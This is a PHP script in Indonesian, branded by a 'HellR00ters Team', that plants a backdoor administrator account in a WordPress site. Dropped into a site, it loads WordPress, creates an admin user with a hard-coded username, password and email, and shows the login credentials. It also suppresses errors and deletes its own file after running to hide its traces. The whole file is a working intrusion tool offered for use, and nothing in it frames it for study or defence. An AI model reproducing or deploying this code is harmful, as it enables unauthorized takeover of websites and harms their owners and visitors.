<?php
// Nonaktifkan error reporting
error_reporting(0);
ini_set('display_errors', 0);

// === KONFIGURASI ===
$new_username = 'adminns';
$new_password = 'HellR00ters@2024!';
$new_email    = 'peler9293@gmail.com';

echo '<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WordPress Admin Creator</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: "Segoe UI", Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
            color: #333;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .container {
            background: rgba(255, 255, 255, 0.95);
            border-radius: 15px;
            padding: 30px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            max-width: 500px;
            width: 100%;
            text-align: center;
        }
        .logo {
            font-size: 3em;
            margin-bottom: 20px;
        }
        .status-box {
            background: #f8f9fa;
            border-radius: 10px;
            padding: 20px;
            margin: 20px 0;
            border-left: 4px solid #3498db;
        }
        .success { border-color: #2ecc71; background: #d5f4e6; }
        .error { border-color: #e74c3c; background: #fadbd8; }
        .credentials {
            background: #2c3e50;
            color: white;
            padding: 15px;
            border-radius: 8px;
            margin: 15px 0;
            font-family: "Courier New", monospace;
        }
        .btn {
            background: linear-gradient(45deg, #4CAF50, #45a049);
            color: white;
            padding: 12px 25px;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            text-decoration: none;
            display: inline-block;
            margin: 10px 5px;
            transition: all 0.3s ease;
        }
        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(76, 175, 80, 0.4);
        }
        .info {
            font-size: 14px;
            color: #7f8c8d;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">🔧</div>
        <h1>WordPress Admin Creator</h1>
        <p>Creating administrator account via WordPress</p>
        
        <div id="status" class="status-box">
            ⏳ Initializing...
        </div>';

// Fungsi untuk buat user admin
function create_wp_admin($username, $password, $email) {
    // Cari file wp-load.php
    $wp_load_paths = [
        './wp-load.php',
        '../wp-load.php', 
        '../../wp-load.php',
        '../../../wp-load.php',
        'wp-load.php',
        '../wp-load.php',
        '../../wp-load.php',
        '../../../wp-load.php',
        '/wp-load.php'
    ];
    
    $wp_loaded = false;
    foreach ($wp_load_paths as $path) {
        if (file_exists($path)) {
            require_once($path);
            $wp_loaded = true;
            break;
        }
    }
    
    if (!$wp_loaded) {
        return ["status" => "error", "message" => "❌ WordPress tidak ditemukan"];
    }
    
    // Check jika WordPress berhasil di-load
    if (!function_exists('wp_insert_user')) {
        return ["status" => "error", "message" => "❌ WordPress functions tidak tersedia"];
    }
    
    // Check jika user sudah ada
    if (username_exists($username)) {
        return ["status" => "error", "message" => "❌ Username sudah ada"];
    }
    
    if (email_exists($email)) {
        return ["status" => "error", "message" => "❌ Email sudah terdaftar"];
    }
    
    // Buat user baru
    $user_id = wp_insert_user([
        'user_login' => $username,
        'user_pass'  => $password,
        'user_email' => $email,
        'role'       => 'administrator',
        'display_name' => 'HellR00ters Admin'
    ]);
    
    if (is_wp_error($user_id)) {
        return ["status" => "error", "message" => "❌ Gagal membuat user: " . $user_id->get_error_message()];
    }
    
    return [
        "status" => "success", 
        "message" => "✅ Admin account berhasil dibuat!",
        "user_id" => $user_id,
        "credentials" => [
            'username' => $username,
            'password' => $password,
            'email' => $email
        ]
    ];
}

// Eksekusi pembuatan user
$result = create_wp_admin($new_username, $new_password, $new_email);

// Tampilkan hasil
if ($result['status'] === 'success') {
    echo '<div class="status-box success">
            <h3>✅ SUCCESS!</h3>
            <p>' . $result['message'] . '</p>
          </div>';
    
    echo '<div class="credentials">
            <strong>🔐 LOGIN CREDENTIALS:</strong><br>
            📧 Username: <strong>' . $result['credentials']['username'] . '</strong><br>
            🔑 Password: <strong>' . $result['credentials']['password'] . '</strong><br>
            ✉️ Email: <strong>' . $result['credentials']['email'] . '</strong>
          </div>';
    
    // Cari URL login
    $login_url = './wp-login.php';
    $login_paths = ['wp-login.php', '../wp-login.php', '../../wp-login.php'];
    foreach ($login_paths as $path) {
        if (file_exists($path)) {
            $login_url = $path;
            break;
        }
    }
    
    echo '<div>
            <a href="' . $login_url . '" class="btn" target="_blank">🚀 Login ke WordPress</a>
            <button onclick="copyCredentials()" class="btn">📋 Copy Credentials</button>
          </div>';
    
} else {
    echo '<div class="status-box error">
            <h3>❌ ERROR</h3>
            <p>' . $result['message'] . '</p>
          </div>';
    
    echo '<div class="info">
            <p><strong>Alternative Methods:</strong></p>
            <p>1. Upload file ini ke root WordPress</p>
            <p>2. Pastikan ada file wp-load.php</p>
            <p>3. Jalankan via browser</p>
          </div>';
}

echo '<div class="info">
        <p><strong>Created by HellR00ters Team</strong></p>
        <p>File akan auto-delete setelah dijalankan</p>
      </div>

<script>
function copyCredentials() {
    const text = `Username: ' . $new_username . '\\nPassword: ' . $new_password . '\\nEmail: ' . $new_email . '`;
    navigator.clipboard.writeText(text).then(function() {
        alert("✅ Credentials copied to clipboard!");
    }, function(err) {
        alert("❌ Failed to copy: " + err);
    });
}

// Update status
document.getElementById("status").innerHTML = "<strong>Status:</strong> Process completed";
</script>

</body>
</html>';

// Auto-delete script setelah dijalankan
register_shutdown_function(function() {
    @unlink(__FILE__);
});
?>
